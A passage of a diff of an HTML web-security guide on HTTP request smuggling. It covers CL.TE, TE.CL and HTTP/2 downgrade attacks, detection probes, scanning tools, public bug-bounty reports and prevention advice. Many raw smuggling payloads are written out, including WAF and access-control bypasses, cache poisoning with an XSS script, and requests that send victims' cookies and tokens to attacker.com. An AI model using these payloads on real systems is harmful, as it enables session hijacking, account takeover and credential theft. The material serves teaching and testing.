-X-Ignore:X
-</code></pre><p>If next request returns 404 for a page that should exist, smuggling is confirmed.</p>
-<h3 id="step-2-confirm-with-request-reflection">
-  <strong>Step 2: Confirm with Request Reflection</strong>
-  <a class="anchor" href="#step-2-confirm-with-request-reflection">#</a>
-</h3>
+X-Ignore:X</code></pre><p>If next request returns 404 for a page that should exist, smuggling is confirmed.</p>
+<h3 id="step-2-confirm-with-request-reflection"><strong>Step 2: Confirm with Request Reflection</strong><a class="anchor" href="#step-2-confirm-with-request-reflection">#</a></h3>
 <p>Inject a prefix that will attach to another user&rsquo;s request:</p>
 <pre tabindex="0"><code>POST /HTTP/1.1
 Host:target.com
@@ -1590,12 +1514,8 @@ POST /search HTTP/1.1
 Host:target.com
 Content-Length:200
 
-search=
-</code></pre><p>Next legitimate user&rsquo;s request gets appended to <code>search=</code> parameter, and their request body (including cookies) appears in search results.</p>
-<h3 id="step-3-weaponize-the-smuggled-request">
-  <strong>Step 3: Weaponize the Smuggled Request</strong>
-  <a class="anchor" href="#step-3-weaponize-the-smuggled-request">#</a>
-</h3>
+search=</code></pre><p>Next legitimate user&rsquo;s request gets appended to <code>search=</code> parameter, and their request body (including cookies) appears in search results.</p>
+<h3 id="step-3-weaponize-the-smuggled-request"><strong>Step 3: Weaponize the Smuggled Request</strong><a class="anchor" href="#step-3-weaponize-the-smuggled-request">#</a></h3>
 <p><strong>Bypass Front-End Access Controls:</strong></p>
 <pre tabindex="0"><code>POST /HTTP/1.1
 Host:target.com
@@ -1607,8 +1527,7 @@ Transfer-Encoding:chunked
 GET /admin
 HTTP/1.1
 Host:target.com
-X-Ignore:X
-</code></pre><p>Even if <code>/admin</code> is blocked at front-end, smuggled request bypasses directly to back-end.</p>
+X-Ignore:X</code></pre><p>Even if <code>/admin</code> is blocked at front-end, smuggled request bypasses directly to back-end.</p>
 <p><strong>Manipulate Next User&rsquo;s Request:</strong></p>
 <pre tabindex="0"><code>POST /HTTP/1.1
 Host:target.com
@@ -1621,11 +1540,7 @@ GET /my-account
 HTTP/1.1
 Host:target.com
 Cookie:session=ATTACKER_SESSION
-X-Ignore:X
-</code></pre><h3 id="te-obfuscation-techniques">
-  <strong>TE Obfuscation Techniques</strong>
-  <a class="anchor" href="#te-obfuscation-techniques">#</a>
-</h3>
+X-Ignore:X</code></pre><h3 id="te-obfuscation-techniques"><strong>TE Obfuscation Techniques</strong><a class="anchor" href="#te-obfuscation-techniques">#</a></h3>
 <p>When basic TE.CL or CL.TE doesn&rsquo;t work, try obfuscating the <code>Transfer-Encoding</code> header:</p>
 <pre tabindex="0"><code>Transfer-Encoding:xchunked
 Transfer-Encoding:chunked
@@ -1634,12 +1549,8 @@ Transfer-Encoding:x
 Transfer-Encoding:[tab]chunked
 Transfer-Encoding: chunkedX:X[\n]
 Transfer-Encoding: chunked
- Transfer-Encoding: chunked
-</code></pre><p>Different servers parse these differently—one may accept, another may reject, creating the discrepancy needed for smuggling.</p>
-<h3 id="chunked-encoding-manipulation">
-  <strong>Chunked Encoding Manipulation</strong>
-  <a class="anchor" href="#chunked-encoding-manipulation">#</a>
-</h3>
+ Transfer-Encoding: chunked</code></pre><p>Different servers parse these differently—one may accept, another may reject, creating the discrepancy needed for smuggling.</p>
+<h3 id="chunked-encoding-manipulation"><strong>Chunked Encoding Manipulation</strong><a class="anchor" href="#chunked-encoding-manipulation">#</a></h3>
 <pre tabindex="0"><code>POST /HTTP/1.1
 Host:target.com
 Content-Type:application/x-www-form-urlencoded
@@ -1651,17 +1562,10 @@ Transfer-Encoding:chunked
 GET /admin HTTP/1.1
 Host:target.com
 Content-Type:application/x-www-form-urlencoded
-Content-Length:15x=10
-</code></pre><p>Chunk size <code>96</code> (hex) = 150 bytes. The smuggled GET request with its own headers is embedded within the chunk.</p>
+Content-Length:15x=10</code></pre><p>Chunk size <code>96</code> (hex) = 150 bytes. The smuggled GET request with its own headers is embedded within the chunk.</p>
 <hr>
-<h2 id="advanced-attack-scenarios">
-  <strong>Advanced Attack Scenarios</strong>
-  <a class="anchor" href="#advanced-attack-scenarios">#</a>
-</h2>
-<h3 id="1-cache-poisoning-via-smuggling">
-  <strong>1. Cache Poisoning via Smuggling</strong>
-  <a class="anchor" href="#1-cache-poisoning-via-smuggling">#</a>
-</h3>
+<h2 id="advanced-attack-scenarios"><strong>Advanced Attack Scenarios</strong><a class="anchor" href="#advanced-attack-scenarios">#</a></h2>
+<h3 id="1-cache-poisoning-via-smuggling"><strong>1. Cache Poisoning via Smuggling</strong><a class="anchor" href="#1-cache-poisoning-via-smuggling">#</a></h3>
 <p>Poison CDN/proxy cache to serve malicious content to all users:</p>
 <pre tabindex="0"><code>POST /HTTP/1.1
 Host:target.com
@@ -1672,12 +1576,8 @@ Transfer-Encoding:chunked
 
 GET /static/script.jsHTTP/1.1
 Host:target.com
-Content-Length:44&lt;script&gt;alert(document.cookie)&lt;/script&gt;
-</code></pre><p>If the response to smuggled request gets cached for <code>/static/script.js</code>, all subsequent visitors receive the XSS payload.</p>
-<h3 id="2-session-hijacking--cookie-stealing">
-  <strong>2. Session Hijacking / Cookie Stealing</strong>
-  <a class="anchor" href="#2-session-hijacking--cookie-stealing">#</a>
-</h3>
+Content-Length:44&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre><p>If the response to smuggled request gets cached for <code>/static/script.js</code>, all subsequent visitors receive the XSS payload.</p>
+<h3 id="2-session-hijacking--cookie-stealing"><strong>2. Session Hijacking / Cookie Stealing</strong><a class="anchor" href="#2-session-hijacking--cookie-stealing">#</a></h3>
 <p>Capture another user&rsquo;s request (including cookies) by reflecting it back:</p>
 <pre tabindex="0"><code>POST /HTTP/1.1
 Host:target.com
@@ -1690,8 +1590,7 @@ POST /logHTTP/1.1
 Host:attacker.com
 Content-Length:500
 
-data=
-</code></pre><p>Next user&rsquo;s request appends to <code>data=</code>, sending their entire request (with session cookies) to attacker&rsquo;s server.</p>
+data=</code></pre><p>Next user&rsquo;s request appends to <code>data=</code>, sending their entire request (with session cookies) to attacker&rsquo;s server.</p>
 <p><strong>Real-world example (Slack):</strong></p>
 <pre tabindex="0"><code>POST /HTTP/1.1
 Host:slackb.com
@@ -1705,12 +1604,8 @@ Host:slackb.com
 Content-Type:application/x-www-form-urlencoded
 Content-Length:1000
 
-log=
-</code></pre><p>Captured session cookies of other Slack users, leading to mass account takeover. <a href="https://hackerone.com/reports/737140" target="_blank" rel="noreferrer noopener nofollow">hackerone.com</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
-<h3 id="3-bypassing-security-controls">
-  <strong>3. Bypassing Security Controls</strong>
-  <a class="anchor" href="#3-bypassing-security-controls">#</a>
-</h3>
+log=</code></pre><p>Captured session cookies of other Slack users, leading to mass account takeover. <a href="https://hackerone.com/reports/737140" target="_blank" rel="noreferrer noopener nofollow">hackerone.com</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<h3 id="3-bypassing-security-controls"><strong>3. Bypassing Security Controls</strong><a class="anchor" href="#3-bypassing-security-controls">#</a></h3>
 <p><strong>WAF Bypass:</strong> Smuggled request bypasses WAF inspection since it&rsquo;s hidden within what WAF sees as legitimate request body.</p>
 <pre tabindex="0"><code>POST /harmless HTTP/1.1
 Host:target.com
@@ -1721,19 +1616,14 @@ Transfer-Encoding:chunked
 
 GET /admin?cmd=whoami HTTP/1.1
 Host:target.com
-X-Ignore:X
-</code></pre><p>WAF scans <code>/harmless</code>, smuggled request to <code>/admin?cmd=whoami</code> passes through.</p>
+X-Ignore:X</code></pre><p>WAF scans <code>/harmless</code>, smuggled request to <code>/admin?cmd=whoami</code> passes through.</p>
 <p><strong>IP-Based Access Control Bypass:</strong></p>
 <pre tabindex="0"><code>POST / HTTP/1.1
 Host:target.com
 Content-Length:60Transfer-Encoding:chunked
 0
 GET /internal-api HTTP/1.1
-Host:internal.target.com
-</code></pre><h3 id="4-on-site-redirect-to-open-redirect-escalation">
-  <strong>4. On-Site Redirect to Open Redirect Escalation</strong>
-  <a class="anchor" href="#4-on-site-redirect-to-open-redirect-escalation">#</a>
-</h3>
+Host:internal.target.com</code></pre><h3 id="4-on-site-redirect-to-open-redirect-escalation"><strong>4. On-Site Redirect to Open Redirect Escalation</strong><a class="anchor" href="#4-on-site-redirect-to-open-redirect-escalation">#</a></h3>
 <p>Combine smuggling with a redirect endpoint:</p>
 <pre tabindex="0"><code>POST /HTTP/1.1
 Host:target.com
@@ -1745,12 +1635,8 @@ Transfer-Encoding:chunked
 GET /redirect?url=[attacker.com](https://attacker.com/)HTTP/1.1
 Host:target.com
 Cookie:session=VICTIM_SESSION
-X-Ignore:X
-</code></pre><p>Next user&rsquo;s response is a redirect to attacker&rsquo;s site, potentially with their cookies/tokens in the Referer header.</p>
-<h3 id="5-web-cache-deception-via-smuggling">
-  <strong>5. Web Cache Deception via Smuggling</strong>
-  <a class="anchor" href="#5-web-cache-deception-via-smuggling">#</a>
-</h3>
+X-Ignore:X</code></pre><p>Next user&rsquo;s response is a redirect to attacker&rsquo;s site, potentially with their cookies/tokens in the Referer header.</p>
+<h3 id="5-web-cache-deception-via-smuggling"><strong>5. Web Cache Deception via Smuggling</strong><a class="anchor" href="#5-web-cache-deception-via-smuggling">#</a></h3>
 <pre tabindex="0"><code>POST /HTTP/1.1
 Host:target.com
 Content-Length:80
@@ -1760,12 +1646,8 @@ Transfer-Encoding:chunked
 
 GET /account/settings HTTP/1.1
 Host:target.com
-X-Ignore:X
-</code></pre><p>If next request is for a static resource that gets cached (e.g., <code>/styles.css</code>), and response contains victim&rsquo;s account page, attacker can retrieve cached sensitive data.</p>
-<h3 id="6-xss-via-request-smuggling">
-  <strong>6. XSS via Request Smuggling</strong>
-  <a class="anchor" href="#6-xss-via-request-smuggling">#</a>
-</h3>
+X-Ignore:X</code></pre><p>If next request is for a static resource that gets cached (e.g., <code>/styles.css</code>), and response contains victim&rsquo;s account page, attacker can retrieve cached sensitive data.</p>
+<h3 id="6-xss-via-request-smuggling"><strong>6. XSS via Request Smuggling</strong><a class="anchor" href="#6-xss-via-request-smuggling">#</a></h3>
 <p>Inject XSS into a reflected parameter that gets processed by the back-end:</p>
 <pre tabindex="0"><code>POST /HTTP/1.1
 Host:target.com
@@ -1775,11 +1657,7 @@ Transfer-Encoding:chunked
 0
 
 GET /search?q=&lt;script&gt;document.location=&#39;[attacker.com](https://attacker.com/?c=)&#39;+document.cookie&lt;/script&gt;HTTP/1.1
-Host:target.com
-</code></pre><h3 id="7-csrf-via-smuggling">
-  <strong>7. CSRF via Smuggling</strong>
-  <a class="anchor" href="#7-csrf-via-smuggling">#</a>
-</h3>
+Host:target.com</code></pre><h3 id="7-csrf-via-smuggling"><strong>7. CSRF via Smuggling</strong><a class="anchor" href="#7-csrf-via-smuggling">#</a></h3>
 <p>Force authenticated actions by hijacking another user&rsquo;s session context:</p>
 <pre tabindex="0"><code>POST /HTTP/1.1
 Host:target.com
@@ -1793,12 +1671,8 @@ Host:target.com
 Content-Type:application/x-www-form-urlencoded
 Content-Length:30
 
-email=attacker@evil.com
-</code></pre><p>Next authenticated user&rsquo;s request completes this email change with their session.</p>
-<h3 id="8-tokencredential-theft-zomato-example">
-  <strong>8. Token/Credential Theft (Zomato Example)</strong>
-  <a class="anchor" href="#8-tokencredential-theft-zomato-example">#</a>
-</h3>
+email=attacker@evil.com</code></pre><p>Next authenticated user&rsquo;s request completes this email change with their session.</p>
+<h3 id="8-tokencredential-theft-zomato-example"><strong>8. Token/Credential Theft (Zomato Example)</strong><a class="anchor" href="#8-tokencredential-theft-zomato-example">#</a></h3>
 <pre tabindex="0"><code>POST /HTTP/1.1
 Host:api.zomato.com
 Content-Length:150
@@ -1811,27 +1685,16 @@ Host:attacker.com
 Content-Type:application/x-www-form-urlencoded
 Content-Length:1500
 
-stolen=
-</code></pre><p>Captured X-Access-Tokens from other Zomato API users. <a href="https://hackerone.com/reports/771666" target="_blank" rel="noreferrer noopener nofollow">hackerone.com</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+stolen=</code></pre><p>Captured X-Access-Tokens from other Zomato API users. <a href="https://hackerone.com/reports/771666" target="_blank" rel="noreferrer noopener nofollow">hackerone.com</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <hr>
-<h2 id="http2-specific-scenarios">
-  <strong>HTTP/2 Specific Scenarios</strong>
-  <a class="anchor" href="#http2-specific-scenarios">#</a>
-</h2>
-<h3 id="h2cl-http2-to-content-length">
-  <strong>H2.CL (HTTP/2 to Content-Length)</strong>
-  <a class="anchor" href="#h2cl-http2-to-content-length">#</a>
-</h3>
+<h2 id="http2-specific-scenarios"><strong>HTTP/2 Specific Scenarios</strong><a class="anchor" href="#http2-specific-scenarios">#</a></h2>
+<h3 id="h2cl-http2-to-content-length"><strong>H2.CL (HTTP/2 to Content-Length)</strong><a class="anchor" href="#h2cl-http2-to-content-length">#</a></h3>
 <pre tabindex="0"><code>:method POST
 :path /
 :authority vulnerable.com
 content-length 0
-SMUGGLED
-</code></pre><p>Front-end (HTTP/2) ignores body since pseudo-headers indicate no body expected, but forwards <code>content-length: 0</code> to back-end. Back-end (HTTP/1.1) sees <code>Content-Length: 0</code> but receives body bytes, which become next request.</p>
-<h3 id="h2te-http2-to-transfer-encoding">
-  <strong>H2.TE (HTTP/2 to Transfer-Encoding)</strong>
-  <a class="anchor" href="#h2te-http2-to-transfer-encoding">#</a>
-</h3>
+SMUGGLED</code></pre><p>Front-end (HTTP/2) ignores body since pseudo-headers indicate no body expected, but forwards <code>content-length: 0</code> to back-end. Back-end (HTTP/1.1) sees <code>Content-Length: 0</code> but receives body bytes, which become next request.</p>
+<h3 id="h2te-http2-to-transfer-encoding"><strong>H2.TE (HTTP/2 to Transfer-Encoding)</strong><a class="anchor" href="#h2te-http2-to-transfer-encoding">#</a></h3>
 <p>HTTP/2 doesn&rsquo;t use Transfer-Encoding, but during downgrade:</p>
 <pre tabindex="0"><code>:method POST
 :path /
@@ -1840,33 +1703,18 @@ transfer-encoding
 chunked
 0
 GET /admin HTTP/1.1
-Host: vulnerable.com
-</code></pre><h3 id="header-injection-via-http2-crlf">
-  <strong>Header Injection via HTTP/2 CRLF</strong>
-  <a class="anchor" href="#header-injection-via-http2-crlf">#</a>
-</h3>
+Host: vulnerable.com</code></pre><h3 id="header-injection-via-http2-crlf"><strong>Header Injection via HTTP/2 CRLF</strong><a class="anchor" href="#header-injection-via-http2-crlf">#</a></h3>
 <p>HTTP/2 binary framing can include characters illegal in HTTP/1.1:</p>
 <pre tabindex="0"><code>:method GET
 :path /
 :authority vulnerable.com
-foo bar\r\nTransfer-Encoding: chunked
-</code></pre><p>During translation to HTTP/1.1, this becomes header injection.</p>
-<h3 id="request-splitting-via-http2-pseudo-headers">
-  <strong>Request Splitting via HTTP/2 Pseudo-Headers</strong>
-  <a class="anchor" href="#request-splitting-via-http2-pseudo-headers">#</a>
-</h3>
+foo bar\r\nTransfer-Encoding: chunked</code></pre><p>During translation to HTTP/1.1, this becomes header injection.</p>
+<h3 id="request-splitting-via-http2-pseudo-headers"><strong>Request Splitting via HTTP/2 Pseudo-Headers</strong><a class="anchor" href="#request-splitting-via-http2-pseudo-headers">#</a></h3>
 <pre tabindex="0"><code>:method GET
 :path / HTTP/1.1\r\nHost: evil.com\r\n\r\nGET /admin
-:authority vulnerable.com
-</code></pre><hr>
-<h2 id="detection-techniques">
-  <strong>Detection Techniques</strong>
-  <a class="anchor" href="#detection-techniques">#</a>
-</h2>
-<h3 id="manual-detection">
-  <strong>Manual Detection</strong>
-  <a class="anchor" href="#manual-detection">#</a>
-</h3>
+:authority vulnerable.com</code></pre><hr>
+<h2 id="detection-techniques"><strong>Detection Techniques</strong><a class="anchor" href="#detection-techniques">#</a></h2>
+<h3 id="manual-detection"><strong>Manual Detection</strong><a class="anchor" href="#manual-detection">#</a></h3>
 <p><strong>1. Timing-Based Probing</strong></p>
 <p>Send payloads that should cause timeout if vulnerable:</p>
 <p>CL.TE probe:</p>
@@ -1878,8 +1726,7 @@ Transfer-Encoding:chunked
 
 1
 A
-X
-</code></pre><p>Delay = vulnerable to CL.TE</p>
+X</code></pre><p>Delay = vulnerable to CL.TE</p>
 <p>TE.CL probe:</p>
 <pre tabindex="0"><code>POST /HTTP/1.1
 Host:target.com
@@ -1889,125 +1736,113 @@ Transfer-Encoding:chunked
 
 0
 
-X
-</code></pre><p>Delay = vulnerable to TE.CL</p>
+X</code></pre><p>Delay = vulnerable to TE.CL</p>
 <p><strong>2. Differential Response Testing</strong></p>
 <pre tabindex="0"><code>POST /HTTP/1.1
 Host:target.com
 Content-Length:49Transfer-Encoding:chunked
 0
 GET /hopefully-404HTTP/1.1
-Foo:bar
-</code></pre><p>Send normal request immediately after. If you get 404 for a valid page, smuggling confirmed.</p>
+Foo:bar</code></pre><p>Send normal request immediately after. If you get 404 for a valid page, smuggling confirmed.</p>
 <p><strong>3. Response Queue Poisoning Check</strong></p>
 <p>Send smuggled request, then send multiple normal requests. If responses are misaligned (getting responses meant for other requests), confirmed.</p>
 <p><strong>4. Header Obfuscation Fuzzing</strong></p>
 <p>Try various TE header mutations to find one that causes discrepancy between servers.</p>
-<h3 id="automated-detection">
-  <strong>Automated Detection</strong>
-  <a class="anchor" href="#automated-detection">#</a>
-</h3>
+<h3 id="automated-detection"><strong>Automated Detection</strong><a class="anchor" href="#automated-detection">#</a></h3>
 <table>
-<thead>
-<tr>
-<th><strong>Tool</strong></th>
-<th><strong>Description</strong></th>
-<th><strong>Usage</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>smuggler</strong></td>
-<td>Detects CL.TE, TE.CL, TE.TE with various obfuscations</td>
-<td><code>python3 smuggler.py -u [target.com](https://target.com)</code></td>
-</tr>
-<tr>
-<td><strong>http-request-smuggler</strong> (Burp Extension)</td>
-<td>Automated detection within Burp Suite</td>
-<td>Extensions → BApp Store → Install</td>
-</tr>
-<tr>
-<td><strong>h2csmuggler</strong></td>
-<td>HTTP/2 cleartext smuggling detection</td>
-<td><code>python3 h2csmuggler.py -x [target.com](https://target.com)</code></td>
-</tr>
-<tr>
-<td><strong>smuggler.py</strong></td>
-<td>Multiple mutation techniques</td>
-<td><code>python3 smuggler.py -u [target.com](https://target.com) -m all</code></td>
-</tr>
-<tr>
-<td><strong>Burp Turbo Intruder</strong></td>
-<td>Custom timing-based detection</td>
-<td>Load desync-probe script</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th><strong>Tool</strong></th>
+					<th><strong>Description</strong></th>
+					<th><strong>Usage</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><strong>smuggler</strong></td>
+					<td>Detects CL.TE, TE.CL, TE.TE with various obfuscations</td>
+					<td><code>python3 smuggler.py -u [target.com](https://target.com)</code></td>
+			</tr>
+			<tr>
+					<td><strong>http-request-smuggler</strong> (Burp Extension)</td>
+					<td>Automated detection within Burp Suite</td>
+					<td>Extensions → BApp Store → Install</td>
+			</tr>
+			<tr>
+					<td><strong>h2csmuggler</strong></td>
+					<td>HTTP/2 cleartext smuggling detection</td>
+					<td><code>python3 h2csmuggler.py -x [target.com](https://target.com)</code></td>
+			</tr>
+			<tr>
+					<td><strong>smuggler.py</strong></td>
+					<td>Multiple mutation techniques</td>
+					<td><code>python3 smuggler.py -u [target.com](https://target.com) -m all</code></td>
+			</tr>
+			<tr>
+					<td><strong>Burp Turbo Intruder</strong></td>
+					<td>Custom timing-based detection</td>
+					<td>Load desync-probe script</td>
+			</tr>
+	</tbody>
 </table>
 <p><strong>Smuggler Tool Usage:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Basic scan</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Basic scan</span>
 </span></span><span style="display:flex;"><span>python3smuggler.py-u <span style="color:#f92672">[</span>target.com<span style="color:#f92672">](</span>https://target.com<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># With all mutations</span>
 </span></span><span style="display:flex;"><span>python3smuggler.py-u <span style="color:#f92672">[</span>target.com<span style="color:#f92672">](</span>https://target.com<span style="color:#f92672">)</span> -m all
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Specify config</span>
-</span></span><span style="display:flex;"><span>python3smuggler.py-u <span style="color:#f92672">[</span>target.com<span style="color:#f92672">](</span>https://target.com<span style="color:#f92672">)</span> -c default
-</span></span></code></pre></div><p><strong>Burp Suite Workflow:</strong></p>
+</span></span><span style="display:flex;"><span>python3smuggler.py-u <span style="color:#f92672">[</span>target.com<span style="color:#f92672">](</span>https://target.com<span style="color:#f92672">)</span> -c default</span></span></code></pre></div><p><strong>Burp Suite Workflow:</strong></p>
 <ol>
 <li>Install HTTP Request Smuggler extension</li>
 <li>Right-click request → Extensions → HTTP Request Smuggler → Smuggle Probe</li>
 <li>Review results in Dashboard/Logger</li>
 </ol>
 <hr>
-<h2 id="real-world-bug-bounty-reports">
-  <strong>Real-World Bug Bounty Reports</strong>
-  <a class="anchor" href="#real-world-bug-bounty-reports">#</a>
-</h2>
+<h2 id="real-world-bug-bounty-reports"><strong>Real-World Bug Bounty Reports</strong><a class="anchor" href="#real-world-bug-bounty-reports">#</a></h2>
 <table>
-<thead>
-<tr>
-<th><strong>Target</strong></th>
-<th><strong>Vulnerability</strong></th>
-<th><strong>Impact</strong></th>
-<th><strong>Report</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>Slack</strong></td>
-<td>CL.TE</td>
-<td>Mass session hijacking</td>
-<td><a href="https://hackerone.com/reports/737140" target="_blank" rel="noreferrer noopener nofollow">hackerone.com</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-</tr>
-<tr>
-<td><strong>Zomato</strong></td>
-<td>CL.TE</td>
-<td>X-Access-Token theft in bulk</td>
-<td><a href="https://hackerone.com/reports/771666" target="_blank" rel="noreferrer noopener nofollow">hackerone.com</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-</tr>
-<tr>
-<td><strong>PayPal</strong></td>
-<td>TE.CL</td>
-<td>Cache poisoning</td>
-<td><a href="https://hackerone.com/reports/488147" target="_blank" rel="noreferrer noopener nofollow">hackerone.com</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-</tr>
-<tr>
-<td><strong>New Relic</strong></td>
-<td>CL.TE</td>
-<td>Authentication bypass</td>
-<td><a href="https://hackerone.com/reports/498052" target="_blank" rel="noreferrer noopener nofollow">hackerone.com</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-</tr>
-<tr>
-<td><strong>U.S. DoD</strong></td>
-<td>HTTP/2</td>
-<td>Internal admin access</td>
-<td><a href="https://hackerone.com/reports/867952" target="_blank" rel="noreferrer noopener nofollow">hackerone.com</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th><strong>Target</strong></th>
+					<th><strong>Vulnerability</strong></th>
+					<th><strong>Impact</strong></th>
+					<th><strong>Report</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><strong>Slack</strong></td>
+					<td>CL.TE</td>
+					<td>Mass session hijacking</td>
+					<td><a href="https://hackerone.com/reports/737140" target="_blank" rel="noreferrer noopener nofollow">hackerone.com</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+			</tr>
+			<tr>
+					<td><strong>Zomato</strong></td>
+					<td>CL.TE</td>
+					<td>X-Access-Token theft in bulk</td>
+					<td><a href="https://hackerone.com/reports/771666" target="_blank" rel="noreferrer noopener nofollow">hackerone.com</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+			</tr>
+			<tr>
+					<td><strong>PayPal</strong></td>
+					<td>TE.CL</td>
+					<td>Cache poisoning</td>
+					<td><a href="https://hackerone.com/reports/488147" target="_blank" rel="noreferrer noopener nofollow">hackerone.com</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+			</tr>
+			<tr>
+					<td><strong>New Relic</strong></td>
+					<td>CL.TE</td>
+					<td>Authentication bypass</td>
+					<td><a href="https://hackerone.com/reports/498052" target="_blank" rel="noreferrer noopener nofollow">hackerone.com</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+			</tr>
+			<tr>
+					<td><strong>U.S. DoD</strong></td>
+					<td>HTTP/2</td>
+					<td>Internal admin access</td>
+					<td><a href="https://hackerone.com/reports/867952" target="_blank" rel="noreferrer noopener nofollow">hackerone.com</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+			</tr>
+	</tbody>
 </table>
 <hr>
-<h2 id="impact">
-  <strong>Impact</strong>
-  <a class="anchor" href="#impact">#</a>
-</h2>
+<h2 id="impact"><strong>Impact</strong><a class="anchor" href="#impact">#</a></h2>
 <ul>
 <li><strong>Authentication Bypass:</strong> Access admin panels, internal APIs</li>
 <li><strong>Session Hijacking:</strong> Capture other users&rsquo; cookies and tokens</li>
@@ -2020,10 +1855,7 @@ Foo:bar
 <li><strong>Internal Network Access:</strong> Reach back-end services normally unreachable</li>
 </ul>
 <hr>
-<h2 id="prevention-techniques">
-  <strong>Prevention Techniques</strong>
-  <a class="anchor" href="#prevention-techniques">#</a>
-</h2>
+<h2 id="prevention-techniques"><strong>Prevention Techniques</strong><a class="anchor" href="#prevention-techniques">#</a></h2>
 <ul>
 <li>Use <strong>HTTP/2 end-to-end</strong> across the entire stack (frontend to backend) to eliminate CL/TE ambiguities and avoid HTTP/1.1 downgrades.</li>
 <li><strong>Reject requests</strong> containing both Content-Length and Transfer-Encoding headers (or malformed/duplicate ones) to block CL.TE, TE.CL, and CL.CL variants.</li>
@@ -2033,56 +1865,50 @@ Foo:bar
 <li><strong>Prioritize Transfer-Encoding</strong> over Content-Length (or strictly disallow both) in line with RFC 7230 to mitigate CL.TE/TE.CL mismatches.</li>
 </ul>
 <hr>
-<h2 id="tools">
-  <strong>Tools</strong>
-  <a class="anchor" href="#tools">#</a>
-</h2>
+<h2 id="tools"><strong>Tools</strong><a class="anchor" href="#tools">#</a></h2>
 <table>
-<thead>
-<tr>
-<th><strong>Tool</strong></th>
-<th><strong>Purpose</strong></th>
-<th><strong>Link</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>smuggler</strong></td>
-<td>CL.TE/TE.CL detection</td>
-<td><a href="https://github.com/defparam/smuggler" target="_blank" rel="noreferrer noopener nofollow">github.com</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-</tr>
-<tr>
-<td><strong>http-request-smuggler</strong></td>
-<td>Burp Suite extension</td>
-<td>Burp BApp Store</td>
-</tr>
-<tr>
-<td><strong>h2csmuggler</strong></td>
-<td>HTTP/2 cleartext smuggling</td>
-<td><a href="https://github.com/BishopFox/h2csmuggler" target="_blank" rel="noreferrer noopener nofollow">github.com</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-</tr>
-<tr>
-<td><strong>HTTP Request Smuggler</strong></td>
-<td>Burp extension by PortSwigger</td>
-<td>Burp BApp Store</td>
-</tr>
-<tr>
-<td><strong>Turbo Intruder</strong></td>
-<td>Timing-based detection</td>
-<td>Burp BApp Store</td>
-</tr>
-<tr>
-<td><strong>smuggler.py</strong></td>
-<td>Multiple techniques</td>
-<td><a href="https://github.com/defparam/smuggler" target="_blank" rel="noreferrer noopener nofollow">github.com</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th><strong>Tool</strong></th>
+					<th><strong>Purpose</strong></th>
+					<th><strong>Link</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><strong>smuggler</strong></td>
+					<td>CL.TE/TE.CL detection</td>
+					<td><a href="https://github.com/defparam/smuggler" target="_blank" rel="noreferrer noopener nofollow">github.com</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+			</tr>
+			<tr>
+					<td><strong>http-request-smuggler</strong></td>
+					<td>Burp Suite extension</td>
+					<td>Burp BApp Store</td>
+			</tr>
+			<tr>
+					<td><strong>h2csmuggler</strong></td>
+					<td>HTTP/2 cleartext smuggling</td>
+					<td><a href="https://github.com/BishopFox/h2csmuggler" target="_blank" rel="noreferrer noopener nofollow">github.com</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+			</tr>
+			<tr>
+					<td><strong>HTTP Request Smuggler</strong></td>
+					<td>Burp extension by PortSwigger</td>
+					<td>Burp BApp Store</td>
+			</tr>
+			<tr>
+					<td><strong>Turbo Intruder</strong></td>
+					<td>Timing-based detection</td>
+					<td>Burp BApp Store</td>
+			</tr>
+			<tr>
+					<td><strong>smuggler.py</strong></td>
+					<td>Multiple techniques</td>
+					<td><a href="https://github.com/defparam/smuggler" target="_blank" rel="noreferrer noopener nofollow">github.com</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+			</tr>
+	</tbody>
 </table>
 <hr>
-<h2 id="good-to-read">
-  <strong>Good to Read</strong>
-  <a class="anchor" href="#good-to-read">#</a>
-</h2>
+<h2 id="good-to-read"><strong>Good to Read</strong><a class="anchor" href="#good-to-read">#</a></h2>
 <ul>
 <li><a href="https://portswigger.net/research/http-desync-attacks-reborn" target="_blank" rel="noreferrer noopener nofollow">portswigger.net</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
